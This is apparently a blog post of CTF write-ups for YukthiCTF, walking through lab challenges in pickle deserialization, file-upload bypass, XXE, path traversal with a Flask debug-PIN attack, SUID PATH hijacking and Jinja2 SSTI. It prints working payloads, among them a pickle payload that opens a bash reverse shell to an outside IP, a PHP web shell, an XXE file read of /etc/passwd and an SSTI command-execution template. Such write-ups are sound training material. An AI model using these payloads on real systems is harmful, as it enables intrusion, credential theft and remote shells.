---
title: Yukthi CTF Writeups
author: malformX
date: 2024-03-22 13:25:00 +0530
categories: [CTF, Yukthi]
tags: [CTF, Path_traverse, python, console, debug, ssti, flask, ]
---

This post contains some writeups of the challenges i solved in YukthiCTF.

## Pickle Portal

### Mission 1

The challenge had two missions. From the looks of it, it's obvious that it is a [Pickle Deserialization attack](https://exploit-notes.hdks.org/exploit/web/framework/python/python-pickle-rce/).

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image.png)

The page just has two functions. One is to serialize and the other one is to deserialize whatever we give.

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-1.png)

The serialize function will serialize and give you a base64 encoded str. Vice verse the deserialization func will deserialize the base64 input.

In the code we can see the `PortalGun` class has `exec` fucntion being returned with some redacted code. 
```py
# Secret portal gun object
class PortalGun:
    def __reduce__(self):
        return (exec, ("<missed source>",))
```

This is convenient for us, cuz we can serialize this Class with our custom input which will be exec'd.

The following code will get us the rev shell.
```py
import pickle, base64

class PortalGun:
  def __reduce__(self):
    import subprocess
    return (exec, ('''import os;os.popen("bash -c '/bin/bash -i >& /dev/tcp/10.11.1.200/5000 0>&1'").read()''',))

p = pickle.dumps(PortalGun())


dat = base64.b64encode(p).decode('ASCII')
print(dat)
```
![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-2.png)

### Mission 2
On second mission we have a c source code:

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-4.png)

We have a binary file called `mem_destroyer` which is a suid binary.

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-5.png)

From the source code, we know that the binary loads `mortys_memory.mem` file but then sets the low priv user's uid and calls the shell. But when in that shell we can get into the process directory of that process and see the filesd which are loaded by the process.

`/proc/self/fd` will land us directly into the process's file discriptor directory. We can see our file is mapped to descriptor 3. But when try reading, it doesn't let us.

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-6.png)

But there is a trick with wich we can use `cat` and read the descriptor content.

Feeding the descriptor to `cat` by redirecting it will give us the flag.

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-7.png) 

## Backrooms

This challenge also has two missions. 

### Mission 1
For the initial mission, there will be an php endpoint in the page which has file upload funtionality. We can upload files, but there will by some restrictions, like we can't upload files with `.php` extensions. It can be easily bypassed if we use `.php2` extension instead.

The php payload i used for this is:
```php
<?php system($_GET['cmd']); ?>
```

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-8.png)

After uploading we can directly execute our backdoor like below

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-9.png)

Now we can get a reverse shell and read the first flag.

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-10.png)

##Mission 2

For the second mission, we see there's one python file which can executed as root using sudo.

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-11.png)

Examining that file shows us that our input directly passes into `eval`

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-12.png)

We just need to give it a markdown file which satisfies all those other constraints. 

The following md file will satisfy all those contraints.
```md
# backrooms
## Ticket to me: John Doe

__Ticket Code:__ 
**4+__import__('os').system('/bin/bash')**
```

Upon executing the script we get flag.
![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-13.png)

## Fruity

### Mission 1
The initial foothold in this challege is XXE. teh `/order` endpoints get user input and send it to the server. But before sending everything it sends the data in base64 encoded xml format to `/tracker`.  

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-17.png)

Also, the name param is reflected back in the response. So we can inject our xml entity inside the user tag to make the server reflect whatever we want.

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-18.png)

Base64 encoding the xml like following and sending it to the server will get us the file we intend to read.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
      <userdata>
        <name>&xxe;</name>
        <mail>test</mail>
        <subject>test</subject>
        <comments>test</comments>
      </userdata>
```
![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-20.png)

`/etc/passwd` tells us there is a user called fruit. We can see if it has ssh key and grab it. 

> ssh private key, by default will be under `/home/$USER/.ssh/id_rsa`. In our case `/home/fruit/.ssh/id_rsa`.
{: .prompt-tip}

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-21.png)

Now that we got the ssh key, we can directly ssh into the server and get the flag.

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-22.png)

### Mission 2

There is one binary file called `log_reader` unser fruit directory. It is a suid binary which is owned by root, which means it can execute functions as root user.

Directly running the binary shows us some apache logs file. And running `strings` against the binary give us an hint about what command it might be running on execution.

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-23.png)

If the `tail` is invoked with it's absolute path (ie: /usr/bin/tail) it would've been not exploitable. But because it is suid bit, we can control the PATH variable and the process will have no other choice then using our PATH. We can create a shell script with `/bin/bash` as its content and name it `tail`. Placing it under fruit's home directory and prepending the home dir path to the PATH environmental variable will fool the binary into looking for `tail` binary in our Home directory first.

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-24.png)

Executing the suid binary now, will get us the flag.

## Operation Warehouse

### Mission 1
Initially running Nmap on the ip will tell us there is port 7777 is open. 

About US page at the bottom redirect us to the following page.
![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-25.png)

Looking closely at the URL hints us that the file name is given as parameter here. This screams LFI.

But traversing dirs gives us file not found err.

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-26.png)

We know it is a python app by looking at the Server header in the response. So we can directly see if any app.py or run.py exist in the current folder first.

app.py itself provides us the file. And we have a filter there which sanitize our filename input.

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-27.png)

The function just splits the input with `../` as it's delimeter and appends the dot (.) inbetween them.

It is easy to bypass if you fiddle around it with a bit.

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-28.png)

Now that we have our payload, we can read files.

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-30.png)

It has a user as well, we can try to read the ssh key from the user. But there is none.

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-31.png)

If we noticed before, the python server was running with `debug=True` param. 
![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-29.png)

Which means debug console is enabled. We can visit `/console` and verify.

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-33.png)

If the app is running with Debug enabled and we have file read, we can [guess](https://www.daehee.com/werkzeug-console-pin-exploit/) flask debug console pin all by ourselves.

All we would need is `machine_id` which would be in `/etc/machine-id` and Mac address of the interface which would be in `/sys/class/net/ens33/address`.

But there seems to be no `/sys/class/net/ens33/address`. This might be because there is no ens33 network interface.

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-34.png)

We can list all the interface by grabbing `/proc/net/arp`.

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-35.png)

There itself we can get the MAC addr (But for some reasons it didn't work). We can now use the interface name to get the actual mac address.

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-37.png)

Now we need to convert mac into decimal. You can use python or online sites to do that.

```py
>>> print(0x02420a0b0426)
2482659591206
>>>
```
Now we can grab the `machine-id`

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-36.png)

Ruuning the code gives us the PIN for the console and we can login.

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-38.png)

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-39.png)

We can execute any python code here. So from here you can get a shell using your personal reverse-shell choice.

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-40.png)

### Mission 2

After looking thorugh some stuff, i ran [LinEnum](https://github.com/rebootuser/LinEnum/raw/master/LinEnum.sh), which is one of the [auto linux enum scripts](https://yolospacehacker.com/hackersguide/toolbox.php?id=linenum) like .
And it identified an extra capablity set to python.

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-41.png)

[GTFOBins](https://gtfobins.github.io/gtfobins/python/#capabilities) has a proof of concept which can be used to escalate this misconfigured capablity.

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-42.png)

## Digital Elysium

The challenge description itself tells us that it is ssti. 

Initially it just seems like a static site. The source doesn't have anything intresting as well. 

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-43.png)

We can try usual parameters like `id`,`cmd`, `name` and a lot more. But `name` param itself worked.

> We can also try to brute force the param name by using tools like `ffuf` or `wfuzz`
{: .prompt-tip}

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-44.png)

And ssti payload also works in this param. 

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-45.png)

We can use the following template to get direct code execution. [Refer here](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti) for more payload.

```python
{% raw %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
{% endraw %}
```

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-46.png)

The description told the flag would be in the folder where the password file is.

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-47.png)

They are mentioning the `passwd` which resides in `/etc` folder. So the flag is in `/etc/`. We can get the flag from there.

![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-48.png)